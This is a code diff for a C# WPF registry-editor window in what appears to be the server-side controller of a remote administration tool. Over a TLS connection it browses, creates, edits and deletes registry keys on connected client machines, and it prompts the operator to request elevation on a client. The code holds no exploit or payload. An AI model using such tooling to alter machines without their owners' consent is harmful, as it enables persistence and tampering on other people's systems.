@@ -4,6 +4,7 @@ using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Controls.Primitives;
 using System.Windows.Input;
+using System.Windows.Media;
 using Newtonsoft.Json;
 using SeroServer.Net;
 using SeroServer.Protocol;
@@ -18,13 +19,23 @@ public class RegValueVM : INotifyPropertyChanged
     public string Data      { get; set; } = "";
 }
 
+public class RegKeyNode
+{
+    public string FullPath   { get; set; } = "";
+    public string Name       { get; set; } = "";
+    public bool   IsRoot     { get; set; }
+    public bool   IsLoaded   { get; set; }
+}
+
 public partial class RegistryEditorWindow : Window
 {
-    private readonly TlsServer _server;
-    private readonly string    _clientId;
-    private readonly ObservableCollection<string>    _subKeys = [];
-    private readonly ObservableCollection<RegValueVM> _values  = [];
-    private string _currentPath = @"HKEY_LOCAL_MACHINE\SOFTWARE";
+    private readonly TlsServer  _server;
+    private readonly string     _clientId;
+    private readonly ObservableCollection<RegValueVM> _values = [];
+    private string _currentPath = "";
+
+    // Root hives
+    private static readonly string[] _roots = ["HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS"];
 
     public RegistryEditorWindow(TlsServer server, string clientId, string label)
     {
@@ -32,21 +43,96 @@ public partial class RegistryEditorWindow : Window
         _server   = server;
         _clientId = clientId;
         TxtTitle.Text = label;
-        TxtPath.Text = _currentPath;
-        ListSubKeys.ItemsSource = _subKeys;
-        GridValues.ItemsSource  = _values;
+        GridValues.ItemsSource = _values;
+
         _server.RegisterHandler(clientId, PacketType.RegChildrenResult, OnChildren);
         _server.RegisterHandler(clientId, PacketType.RegAck, OnAck);
-        Closed += (_, _) => { _server.UnregisterHandler(clientId, PacketType.RegChildrenResult); _server.UnregisterHandler(clientId, PacketType.RegAck); };
-        Navigate(_currentPath);
+        Closed += (_, _) =>
+        {
+            _server.UnregisterHandler(clientId, PacketType.RegChildrenResult);
+            _server.UnregisterHandler(clientId, PacketType.RegAck);
+        };
+
+        BuildRootNodes();
     }
 
-    private void Navigate(string path)
+    // ── Tree building ─────────────────────────────────────────────────────────
+
+    private void BuildRootNodes()
     {
-        _currentPath = path;
-        TxtPath.Text = path;
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegGetChildren, Data = JsonConvert.SerializeObject(new RegGetChildrenData { KeyPath = path }) });
+        RegTree.Items.Clear();
+        foreach (var root in _roots)
+        {
+            var item = MakeTreeItem(root, root, isRoot: true);
+            RegTree.Items.Add(item);
+        }
     }
+
+    private TreeViewItem MakeTreeItem(string name, string fullPath, bool isRoot = false)
+    {
+        var item = new TreeViewItem
+        {
+            Tag = new RegKeyNode { FullPath = fullPath, Name = name, IsRoot = isRoot }
+        };
+
+        // Header: folder icon + name
+        var panel = new StackPanel { Orientation = System.Windows.Controls.Orientation.Horizontal };
+        panel.Children.Add(new TextBlock
+        {
+            Text = "📁", FontSize = 11,
+            VerticalAlignment = VerticalAlignment.Center,
+            Margin = new Thickness(0, 0, 5, 0)
+        });
+        panel.Children.Add(new TextBlock
+        {
+            Text = name,
+            Foreground = isRoot
+                ? new SolidColorBrush(Color.FromRgb(0xAA, 0xB8, 0xF0))
+                : new SolidColorBrush(Color.FromRgb(0xCC, 0xD0, 0xE8)),
+            VerticalAlignment = VerticalAlignment.Center
+        });
+        item.Header = panel;
+
+        // Dummy child so the expand arrow appears
+        item.Items.Add(new TreeViewItem { Header = "⌛ Loading…", Foreground = new SolidColorBrush(Color.FromRgb(0x40, 0x48, 0x68)) });
+        item.Expanded += TreeItem_Expanded;
+        return item;
+    }
+
+    private TreeViewItem? _pendingExpand;
+    private string?       _pendingPath;
+
+    private void TreeItem_Expanded(object s, RoutedEventArgs e)
+    {
+        if (s is not TreeViewItem item) return;
+        if (item.Tag is not RegKeyNode node) return;
+        if (node.IsLoaded) return;
+
+        _pendingExpand = item;
+        _pendingPath   = null; // Children response will populate this
+        RequestChildren(node.FullPath);
+        e.Handled = true;
+    }
+
+    private void RegTree_SelectedItemChanged(object s, RoutedPropertyChangedEventArgs<object> e)
+    {
+        if (RegTree.SelectedItem is not TreeViewItem item) return;
+        if (item.Tag is not RegKeyNode node) return;
+        _currentPath = node.FullPath;
+        TxtPath.Text = _currentPath;
+        RequestChildren(_currentPath);
+    }
+
+    private void RequestChildren(string path)
+    {
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegGetChildren,
+            Data = JsonConvert.SerializeObject(new RegGetChildrenData { KeyPath = path })
+        });
+    }
+
+    // ── Incoming packets ──────────────────────────────────────────────────────
 
     private void OnChildren(Packet pkt)
     {
@@ -54,12 +140,58 @@ public partial class RegistryEditorWindow : Window
         if (d == null) return;
         Dispatcher.BeginInvoke(() =>
         {
-            _subKeys.Clear();
-            foreach (var k in d.SubKeys) _subKeys.Add(k);
+            if (!string.IsNullOrEmpty(d.Error))
+            {
+                TxtStatus.Text = $"Error: {d.Error}";
+                return;
+            }
+
+            _currentPath = d.KeyPath;
+            TxtPath.Text  = _currentPath;
+
+            // Update values grid
             _values.Clear();
-            foreach (var v in d.Values) _values.Add(new RegValueVM { Name = v.Name, ValueType = v.ValueType, Data = v.Data });
-            TxtStatus.Text = string.IsNullOrEmpty(d.Error) ? $"{d.SubKeys.Count} keys, {d.Values.Count} values — {d.KeyPath}" : $"Error: {d.Error}";
+            foreach (var v in d.Values)
+                _values.Add(new RegValueVM { Name = string.IsNullOrEmpty(v.Name) ? "(Default)" : v.Name, ValueType = v.ValueType, Data = v.Data });
+
+            TxtStatus.Text = $"{d.SubKeys.Count} key(s) · {d.Values.Count} value(s)  —  {_currentPath}";
+
+            // Populate tree: find the item that requested this
+            PopulateTreeItem(d.KeyPath, d.SubKeys);
         });
+    }
+
+    private void PopulateTreeItem(string keyPath, List<string> subKeys)
+    {
+        // Find the TreeViewItem matching this path
+        var item = FindTreeItem(RegTree.Items, keyPath);
+        if (item == null) return;
+        if (item.Tag is RegKeyNode node) node.IsLoaded = true;
+
+        item.Items.Clear();
+        foreach (var sub in subKeys)
+        {
+            var childPath = keyPath.TrimEnd('\\') + "\\" + sub;
+            item.Items.Add(MakeTreeItem(sub, childPath));
+        }
+        if (subKeys.Count == 0)
+            item.Items.Add(new TreeViewItem { Header = "  (empty)", Foreground = new SolidColorBrush(Color.FromRgb(0x30, 0x38, 0x58)), IsHitTestVisible = false });
+    }
+
+    private static TreeViewItem? FindTreeItem(ItemCollection items, string path)
+    {
+        foreach (var obj in items)
+        {
+            if (obj is not TreeViewItem tvi) continue;
+            if (tvi.Tag is RegKeyNode node && node.FullPath.Equals(path, StringComparison.OrdinalIgnoreCase))
+                return tvi;
+            if (tvi.IsExpanded)
+            {
+                var found = FindTreeItem(tvi.Items, path);
+                if (found != null) return found;
+            }
+        }
+        return null;
     }
 
     private void OnAck(Packet pkt)
@@ -68,78 +200,136 @@ public partial class RegistryEditorWindow : Window
         if (d == null) return;
         Dispatcher.BeginInvoke(() =>
         {
-            TxtStatus.Text = d.Success ? "Done." : $"Error: {d.Error}";
-            if (d.Success) Navigate(_currentPath);
+            if (d.Success)
+            {
+                TxtStatus.Text = "Operation successful.";
+                // Reload current path
+                if (_pendingExpand?.Tag is RegKeyNode n) n.IsLoaded = false;
+                RequestChildren(_currentPath);
+            }
+            else
+            {
+                var msg = d.Error;
+                // Hint for access denied
+                if (msg.Contains("Access", StringComparison.OrdinalIgnoreCase) ||
+                    msg.Contains("denied", StringComparison.OrdinalIgnoreCase) ||
+                    msg.Contains("Unauthorized", StringComparison.OrdinalIgnoreCase))
+                {
+                    MessageBox.Show(
+                        $"Access denied.\n\nThis key requires admin privileges.\nRequest elevation on the client first.\n\nError: {msg}",
+                        "Admin Required", MessageBoxButton.OK, MessageBoxImage.Warning);
+                }
+                else
+                {
+                    TxtStatus.Text = $"Error: {msg}";
+                }
+            }
         });
     }
 
-    private void SubKey_SelectionChanged(object s, SelectionChangedEventArgs e)
-    {
-        if (ListSubKeys.SelectedItem is string sub)
-            Navigate(_currentPath.TrimEnd('\\') + "\\" + sub);
-    }
+    // ── Actions ───────────────────────────────────────────────────────────────
 
-    private void BtnGo_Click(object s, RoutedEventArgs e) => Navigate(TxtPath.Text.Trim());
-    private void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Enter) Navigate(TxtPath.Text.Trim()); }
+    private void BtnGo_Click(object s, RoutedEventArgs e) => RequestChildren(TxtPath.Text.Trim());
+    private void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Enter) RequestChildren(TxtPath.Text.Trim()); }
+    private void TreeRefresh_Click(object s, RoutedEventArgs e) => RequestChildren(_currentPath);
 
     private void BtnNewKey_Click(object s, RoutedEventArgs e)
     {
+        if (string.IsNullOrEmpty(_currentPath)) return;
         var name = SimpleInput("New key name:");
         if (string.IsNullOrWhiteSpace(name)) return;
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegCreateKey, Data = JsonConvert.SerializeObject(new RegCreateKeyData { KeyPath = _currentPath.TrimEnd('\\') + "\\" + name }) });
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegCreateKey,
+            Data = JsonConvert.SerializeObject(new RegCreateKeyData { KeyPath = _currentPath.TrimEnd('\\') + "\\" + name })
+        });
     }
 
     private void BtnNewValue_Click(object s, RoutedEventArgs e)
     {
+        if (string.IsNullOrEmpty(_currentPath)) return;
         var name = SimpleInput("Value name:");
         if (string.IsNullOrWhiteSpace(name)) return;
-        var data = SimpleInput("Value data:", "");
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegSetValue, Data = JsonConvert.SerializeObject(new RegSetValueData { KeyPath = _currentPath, Name = name, ValueType = "REG_SZ", Data = data ?? "" }) });
+        var data = SimpleInput($"Data for \"{name}\":", "") ?? "";
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegSetValue,
+            Data = JsonConvert.SerializeObject(new RegSetValueData { KeyPath = _currentPath, Name = name, ValueType = "REG_SZ", Data = data })
+        });
     }
 
     private void BtnDeleteKey_Click(object s, RoutedEventArgs e)
     {
-        if (MessageBox.Show($"Delete key:\n{_currentPath}?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegDeleteKey, Data = JsonConvert.SerializeObject(new RegDeleteKeyData { KeyPath = _currentPath }) });
+        if (string.IsNullOrEmpty(_currentPath)) return;
+        var result = MessageBox.Show(
+            $"⚠️  Delete registry key?\n\n{_currentPath}\n\nThis will permanently delete the key and ALL sub-keys and values.\nThis action cannot be undone.",
+            "Confirm Delete Key", MessageBoxButton.YesNo, MessageBoxImage.Warning);
+        if (result != MessageBoxResult.Yes) return;
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegDeleteKey,
+            Data = JsonConvert.SerializeObject(new RegDeleteKeyData { KeyPath = _currentPath })
+        });
     }
 
     private void BtnDeleteValue_Click(object s, RoutedEventArgs e)
     {
         if (GridValues.SelectedItem is not RegValueVM vm) return;
-        if (MessageBox.Show($"Delete value \"{vm.Name}\"?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegDeleteValue, Data = JsonConvert.SerializeObject(new RegDeleteValueData { KeyPath = _currentPath, Name = vm.Name }) });
+        var result = MessageBox.Show(
+            $"Delete value \"{vm.Name}\"?\n\nKey: {_currentPath}",
+            "Confirm Delete Value", MessageBoxButton.YesNo, MessageBoxImage.Warning);
+        if (result != MessageBoxResult.Yes) return;
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegDeleteValue,
+            Data = JsonConvert.SerializeObject(new RegDeleteValueData { KeyPath = _currentPath, Name = vm.Name == "(Default)" ? "" : vm.Name })
+        });
     }
 
-    private void GridValues_DoubleClick(object s, MouseButtonEventArgs e)
+    private void EditValue_Click(object s, RoutedEventArgs e) => EditSelectedValue();
+    private void GridValues_DoubleClick(object s, MouseButtonEventArgs e) => EditSelectedValue();
+    private void EditSelectedValue()
     {
-        if (GridValues.SelectedItem is not RegValueVM vm) return;
-        var newData = SimpleInput($"Edit \"{vm.Name}\":", vm.Data);
+        if (GridValues.SelectedItem is not RegValueVM vm || string.IsNullOrEmpty(_currentPath)) return;
+        var newData = SimpleInput($"Edit  \"{vm.Name}\"  [{vm.ValueType}]:", vm.Data);
         if (newData == null || newData == vm.Data) return;
-        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RegSetValue, Data = JsonConvert.SerializeObject(new RegSetValueData { KeyPath = _currentPath, Name = vm.Name, ValueType = vm.ValueType, Data = newData }) });
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.RegSetValue,
+            Data = JsonConvert.SerializeObject(new RegSetValueData
+            {
+                KeyPath   = _currentPath,
+                Name      = vm.Name == "(Default)" ? "" : vm.Name,
+                ValueType = vm.ValueType,
+                Data      = newData
+            })
+        });
     }
 
-    private static string? SimpleInput(string prompt, string? defaultValue = null)
+    // ── Input dialog ──────────────────────────────────────────────────────────
+
+    private static string? SimpleInput(string prompt, string? def = null)
     {
         var dlg = new Window
         {
-            Title = prompt, Width = 400, Height = 130,
+            Title = "Registry Editor", Width = 420, Height = 130,
             WindowStartupLocation = WindowStartupLocation.CenterOwner,
             ResizeMode = ResizeMode.NoResize, WindowStyle = WindowStyle.ToolWindow,
-            Background = new SolidColorBrush(Color.FromRgb(0x12, 0x14, 0x22))
+            Background = new SolidColorBrush(Color.FromRgb(0x0C, 0x0D, 0x18))
         };
-        var stack = new StackPanel { Margin = new Thickness(12) };
-        stack.Children.Add(new TextBlock { Text = prompt, Foreground = Brushes.White, Margin = new Thickness(0, 0, 0, 6) });
-        var txt = new System.Windows.Controls.TextBox { Text = defaultValue ?? "", Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1C, 0x2E)), Foreground = Brushes.White, BorderBrush = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5)), BorderThickness = new Thickness(1), Padding = new Thickness(4), Margin = new Thickness(0, 0, 0, 8) };
-        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right, Background = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5)), Foreground = Brushes.White, BorderThickness = new Thickness(0), Padding = new Thickness(0, 4, 0, 4) };
+        var sp  = new StackPanel { Margin = new Thickness(14) };
+        var lbl = new System.Windows.Controls.TextBlock { Text = prompt, Foreground = Brushes.White, Margin = new Thickness(0,0,0,7), FontFamily = new System.Windows.Media.FontFamily("Segoe UI"), FontSize = 12 };
+        var txt = new System.Windows.Controls.TextBox   { Text = def ?? "", Background = new SolidColorBrush(Color.FromRgb(0x0A, 0x0C, 0x1C)), Foreground = Brushes.White, BorderBrush = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5)), BorderThickness = new Thickness(1), Padding = new Thickness(6, 5, 6, 5), Margin = new Thickness(0,0,0,10), FontFamily = new System.Windows.Media.FontFamily("Consolas"), FontSize = 11 };
+        var btn = new System.Windows.Controls.Button    { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right, Background = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5)), Foreground = Brushes.White, BorderThickness = new Thickness(0), Padding = new Thickness(0, 6, 0, 6) };
         btn.Click += (_, _) => dlg.DialogResult = true;
         txt.KeyDown += (_, ke) => { if (ke.Key == Key.Enter) dlg.DialogResult = true; };
-        stack.Children.Add(txt);
-        stack.Children.Add(btn);
-        dlg.Content = stack;
-        txt.SelectAll();
-        txt.Focus();
+        sp.Children.Add(lbl); sp.Children.Add(txt); sp.Children.Add(btn);
+        dlg.Content = sp;
+        txt.SelectAll(); txt.Focus();
         return dlg.ShowDialog() == true ? txt.Text : null;
     }
+
+    // ── Window chrome ─────────────────────────────────────────────────────────
 
     private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
     { if (e.LeftButton == MouseButtonState.Pressed) DragMove(); }
